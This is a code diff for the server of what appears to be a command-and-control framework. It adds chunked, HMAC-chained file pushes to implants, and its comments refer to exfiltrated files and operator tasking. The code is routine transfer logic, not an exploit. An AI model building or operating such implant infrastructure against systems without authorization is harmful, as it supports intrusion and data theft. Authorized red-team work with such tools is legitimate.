@@ -197,6 +197,34 @@ func parseTransferRange(c *gin.Context) (offset, size int64) {
 	return offset, size
 }
 
+// pushChunk is one offset-addressed slice of a file push. The first chunk
+// truncates at offset 0 on the agent; the rest seek to their offset.
+type pushChunk struct {
+	data   string
+	offset int64
+}
+
+// splitPushChunks slices raw into base64 chunks bounded by
+// MaxTransferChunkSize so no single task row carries a multi-MB blob.
+// Files at or under the cap yield exactly one chunk at offset 0.
+func splitPushChunks(raw []byte) []pushChunk {
+	if len(raw) <= MaxTransferChunkSize {
+		return []pushChunk{{data: base64.StdEncoding.EncodeToString(raw)}}
+	}
+	var chunks []pushChunk
+	for off := 0; off < len(raw); off += MaxTransferChunkSize {
+		end := off + MaxTransferChunkSize
+		if end > len(raw) {
+			end = len(raw)
+		}
+		chunks = append(chunks, pushChunk{
+			data:   base64.StdEncoding.EncodeToString(raw[off:end]),
+			offset: int64(off),
+		})
+	}
+	return chunks
+}
+
 // handleDownload queues an implant URL fetch onto its own disk (task type
 // "download", command = URL). This is not operator exfil.
 func (s *Server) handleDownload(c *gin.Context) {
@@ -258,45 +286,64 @@ func (s *Server) handleUploadFile(c *gin.Context) {
 		respondError(c, http.StatusInternalServerError, "failed to read file")
 		return
 	}
-
-	task := s.issueAgentTask(c, id, TaskSpec{Type: "upload", Command: targetPath, Path: targetPath, Data: fileData})
-	if task == nil {
-		return
-	}
-	// chunked support — validate offset to prevent negative seek corruption and sparse file bomb
-	if offsetStr := c.PostForm("offset"); offsetStr != "" {
-		off, err := strconv.ParseInt(offsetStr, 10, 64)
-		if err != nil || off < 0 || off > 8<<30 {
-			respondError(c, http.StatusBadRequest, "invalid offset")
-			return
-		}
-		task.Offset = off
-	}
-	// HMAC integrity chain: the agent refuses to write the chunk unless the
-	// recomputed MAC matches, so tampering with a pushed chunk is detected
-	// before it touches disk. (Push size is already bounded by MaxUploadSize.)
-	rawChunk, err := base64.StdEncoding.DecodeString(fileData)
+	rawFile, err := base64.StdEncoding.DecodeString(fileData)
 	if err != nil {
 		respondError(c, http.StatusBadRequest, "failed to decode file data")
 		return
 	}
-	if prevMAC, mac, err := s.chainForPush(id, task.ID, rawChunk); err != nil {
-		slog.Error("Failed to build upload integrity chain", "agent_id", id, "task_id", task.ID, "error", err)
-		respondError(c, http.StatusInternalServerError, "failed to sign upload chunk")
-		return
-	} else {
-		task.PrevMAC = prevMAC
-		task.MAC = mac
+
+	// Auto-chunking: files larger than MaxTransferChunkSize are split into
+	// sequential offset-addressed upload tasks (first chunk truncates at
+	// offset 0, the rest seek), each HMAC-chained and bounded to 4MiB so no
+	// single task row carries a multi-MB base64 blob. Small files keep the
+	// legacy single-task path. No agent change needed: uploadFileChunk
+	// already honors offset + per-chunk MAC.
+	chunks := splitPushChunks(rawFile)
+	if len(chunks) == 1 {
+		// chunked support — validate offset to prevent negative seek corruption and sparse file bomb
+		if offsetStr := c.PostForm("offset"); offsetStr != "" {
+			off, err := strconv.ParseInt(offsetStr, 10, 64)
+			if err != nil || off < 0 || off > 8<<30 {
+				respondError(c, http.StatusBadRequest, "invalid offset")
+				return
+			}
+			chunks[0].offset = off
+		}
 	}
-	if err := s.db.Save(task).Error; err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to save upload offset")
-		return
+
+	var taskIDs []uint
+	for _, ch := range chunks {
+		task := s.issueAgentTask(c, id, TaskSpec{Type: "upload", Command: targetPath, Path: targetPath, Data: ch.data, Offset: ch.offset})
+		if task == nil {
+			return
+		}
+		// HMAC integrity chain: the agent refuses to write the chunk unless the
+		// recomputed MAC matches, so tampering with a pushed chunk is detected
+		// before it touches disk. (Each chunk is bounded by MaxTransferChunkSize.)
+		rawChunk, err := base64.StdEncoding.DecodeString(ch.data)
+		if err != nil {
+			respondError(c, http.StatusBadRequest, "failed to decode file data")
+			return
+		}
+		if prevMAC, mac, err := s.chainForPush(id, task.ID, rawChunk); err != nil {
+			slog.Error("Failed to build upload integrity chain", "agent_id", id, "task_id", task.ID, "error", err)
+			respondError(c, http.StatusInternalServerError, "failed to sign upload chunk")
+			return
+		} else {
+			task.PrevMAC = prevMAC
+			task.MAC = mac
+		}
+		if err := s.db.Save(task).Error; err != nil {
+			respondError(c, http.StatusInternalServerError, "failed to save upload offset")
+			return
+		}
+		taskIDs = append(taskIDs, task.ID)
+		s.broadcastTaskUpdate(id, *task)
 	}
-	s.broadcastTaskUpdate(id, *task)
 	s.LogAuditRecord(c, "file_upload_push", "agent", id, targetPath, true, nil)
 
-	slog.Info("File push requested", "agent_id", id, "path", targetPath, "offset", task.Offset)
-	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "kind": "file_push", "queued": true})
+	slog.Info("File push requested", "agent_id", id, "path", targetPath, "chunks", len(taskIDs))
+	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": taskIDs[0], "task_ids": taskIDs, "chunks": len(taskIDs), "kind": "file_push", "queued": true})
 }
 
 // handleFileExfilGet serves a file the implant already exfiltrated into data/uploads/:id/.
